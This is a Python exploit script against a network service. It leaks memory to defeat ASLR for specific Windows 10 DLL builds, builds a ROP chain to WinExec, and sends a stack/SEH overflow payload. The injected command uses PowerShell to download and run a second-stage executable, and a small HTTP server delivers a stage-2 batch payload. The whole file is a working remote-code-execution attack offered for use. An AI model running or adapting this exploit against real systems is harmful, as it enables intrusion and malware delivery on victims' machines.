# -*- coding: utf-8 -*-

import os
import sys
import SocketServer
import socket
import time
import sys
import struct

print (
       "### ###   #      ### ###\r\n"
       "# # # #  ### ### #   # \r\n"
       "### ####  #  # # ##  ##\r\n"
       "# # #  #  #  ### #   # \r\n"
       "nonsense...................\r\n"
       "__________________________________________________\r\n"
       "/***********************************************\\\r\n"
       "| kernel32 v10.0.17134.590 (WinBuild.160101)     |\r\n"
       "| advapi32 >= v10.0.17134.582 (WinBuild.160101)  |\r\n"
       "| ntdll >= v10.0.17134.228 (WinBuild.160101)     |\r\n"
       "\________________________________________________/\r\n" 
       "************************************************"                                
      )

###########################################################

class __s2hnd( SocketServer.BaseRequestHandler ) :

               HEADERS = ( "HTTP/1.1 200 OK\r\n"
                           "Server: Apache\r\n"
                           "Content-Type: text/html; charset=utf-8\r\n"
                           "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                           "Connection: Close\r\n" )

               def _sl_(self, l) :

                        return "Content-Length: " + str( l ) + "\r\n"

               def handle( self ) : 
        
                   #read file
                   f = open( os.path.dirname(sys.argv[0]) + "\\s2.bat")  
                   r = f.read()
                   f.close()

                   a = ( self.HEADERS + self._sl_( len(r) ) + "\r\n" )    
                   a = a + r          
 
                   print '[+]. Stage 2 got connection from attacked machine'
                   print '[+]. Send stage 2 payload to attacked machine'
                   self.request.sendall( a )

###########################################################
    
sData = ''
nSocket = None
sBaseOfKernel = ''

def do_clear( ) :

    nSocket.sendall( "anyuser" )
    nSocket.recv( 2048 )
    nSocket.sendall( "anypass" )
    nSocket.recv( 2048 )

leak_size = 1024 + 8 + 3  #leak offset

def leak_addr( val ) : 

    size = 1024 + 8 + 3  #leak offset
    nSocket.sendall( val * leak_size )
    nSocket.recv( 2048 )

def do_rce( eip_addr, rop_chain ) :  
    
    ROP = rop_chain 

    EIP = ''.join( struct.pack( "<I", eip_addr ) )  #"\x43\x43\x43\x43"
    CMD = "cmd /c PowerShell (New-Object System.Net.WebClient).DownloadFile('http://localhost/pownedStage2.exe','mess.exe');Start-Process 'mess.exe';REM"
    #CMD = "cmd /c PowerShell -NoProfile -NonInteractive -Command [reflection.assembly]::loadwithpartialname('system.windows.forms');[system.Windows.Forms.MessageBox]::show('Powned') && rem "
    #CMD = "cmd /c echo 289381938 > dupa.txt && REM " 
    #layout : winExec addr + pop r32/ret + push arg1/push arg2/ret + call r32 
    rce_payload = rop_chain + CMD + "\x48" * (1040 - len(CMD) - len( rop_chain ) ) + EIP + "\x42\x42\x42\x42" + "\x66" * (0x6a - 0xa) + "\x51\x51\x51\x51" + "\x91\x91\x91\x91" #1048 = CB, 1048 +0x6a = SEH
    
    nSocket.sendall( rce_payload )
    nSocket.recv( 2048 )

    nSocket.sendall( rce_payload )
    nSocket.recv( 2048 )
    
     
nSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "_______________________________________________"
print '[!]. Connecting to server '
nSocket.connect(('localhost', 4337))
#nSocket.connect(('192.168.78.49',4337))

nSocket.recv( 2048 )

print '[+]. Sending payload for memory leak'
sys.stdout.write( '[+]. ' )

PROGRESS = 0
LIB_CNT = 0
libs = []
strs = []

while ( True ) :

  chars = ["*","#"]
  lib_off =  [ "\x84", "\x10" ] # [ "\xA0","\x10" ]

  if ( PROGRESS > 25 ) :
       sys.stdout.write( "\r[+]. " )
       PROGRESS = 0

  sys.stdout.write( chars[LIB_CNT] )
  time.sleep( 0.250 )
  PROGRESS = PROGRESS + 1

  leak_addr( lib_off[LIB_CNT] )
  nSocket.sendall( 'anypass' ) 

  sData = nSocket.recv( 2048 )

  if ( ( lib_off[LIB_CNT] * leak_size ) in sData ) :
         continue 
  
  if ( LIB_CNT > 0 ) :
       if ( strs[0] in sData ) :
            continue

  try :
      sData.decode( 'ascii' )
  except :

         strs.append( sData )
         libs.append( sData[:-2] )
         #libs[ LIB_CNT ] = libs[ LIB_CNT ][len(libs[ LIB_CNT ])-4:]
     
         #leak_addr_len = len( libs[ LIB_CNT ] )

         #if ( leak_addr_len == 4 ) :
         LIB_CNT = LIB_CNT + 1
         if ( LIB_CNT == 2 ) :
              break

sys.stdout.write("\n")

print '[!]. Found non ascii string'    
print '[+]. Whole string\'s : '
print '     '+strs[0].encode("hex")
print '     '+strs[1].encode("hex")

libs[0] = libs[0][:-1]  #this is the modern era the end of 90's xd ;d lol
libs[0] = libs[0][len(libs[0])-4:]
libs[1] = libs[1][len(libs[1])-4:]
libs.append( strs[0] ) 
libs[2] = libs[2][8:12]

libs[0] = libs[0][::-1]  #kernel32 lendian
libs[1] = libs[1][::-1]  #advapi32 lendian
libs[2] = libs[2][::-1]  #ntdll lendian
libs[0] = libs[0].encode( 'hex' )
libs[1] = libs[1].encode( 'hex' )
libs[2] = libs[2].encode( 'hex' )

print '[+]. Leaked addresses : 0x' + libs[0]  #-(0x6F610) = base (kernel32) v10.0.17134.582 (WinBuild.160101), -(0x16490) = base (kernel32) v10.0.17134.376 (WinBuild.160101) 
print '                        0x' + libs[1]  #-(0x23EC0) = base (advapi) v10.0.17134.582 (WinBuild.160101),
print '                        0x' + libs[2]  # 

kernel32 = struct.unpack(">I",libs[0].decode('hex'))[0]
advapi32 = struct.unpack(">I",libs[1].decode('hex'))[0]
ntdll = struct.unpack(">I",libs[2].decode('hex'))[0]

kernel32 = kernel32 - 0x6F860 #0x6F860 v10.0.17134.590 (WinBuild.160101), #91280   #v10.0.17134.376 (WinBuild.160101), 456208  #v10.0.17134.582 (WinBuild.160101)
advapi32 = advapi32 - 147136  #v10.0.17134.582 (WinBuild.160101)
ntdll = ntdll - 0x42910 #(0x42910) #10.0.17134.228 (WinBuild.160101)

winExecAddr = kernel32 + 342400 # 10.0.17134.376 (WinBuild.160101), +342576 #v10.0.17134.582 (WinBuild.160101) 

print '[!]. Building rop chain for RCE '  #mona rop -m "advapi32, kernel32" -cp nonull -rva
print '[+]. Kernel32.dll base address : '+str( hex( kernel32 ) )
print '[+]. Advapi32.dll base address : '+str( hex( advapi32 ) )
print '[+]. Ntdll.dll base address    : '+str( hex( ntdll ) )
print '[+]. Kerenel32!WinExec address : '+str( hex( winExecAddr ) )

#pivot2 + 60 : advapi32 + 0x50C12 ; #v10.0.17134.582 (WinBuild.160101)
pivot2data = advapi32 + 0x50C12

print '[!]. Sending RCE payload to server'
print '[+]. Redirecting flow to controlled data via pivot at : '+ str( hex( pivot2data ) )

rops = [
         0x0d0d0d0d,
         advapi32 + 0x17E8B,  #pop ebx/ret
         0x11111111,
         0x22222222,
         0x33333333,
         0x44444444,
         0x55555555, 
         0xffffffff, #val for ebx
         advapi32 + 0x4A0F5, #inc ebx/ret | ebx  = 0
         advapi32 + 0xFE20, #pop ebp/ret
         0x0c0c0c0c, #ebp = WinExec 
         kernel32 + 0x30385, #pop esi/ret
         winExecAddr,
         kernel32 + 0x2AFC4, #pop edi/ret
         kernel32 + 0x2AFC5, #ret gadget -> edi
         ntdll + 0x101370,  #pushad / ret //0x77bd1370 :  # PUSHAD # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
       ]
ropChain = ''.join(struct.pack('<I', _) for _ in rops)

print '[+]. Enter <stage 2> run server on port 80 tcp'
print '[+]. Call Kernel32!WinExec via '+str(hex(ntdll + 1053552))

stage2 = SocketServer.TCPServer(( "0.0.0.0", 80 ), __s2hnd )
stage2.handle_request( )

print '[+]. Done we win as always'

#do_clear( )

do_rce( pivot2data, ropChain )


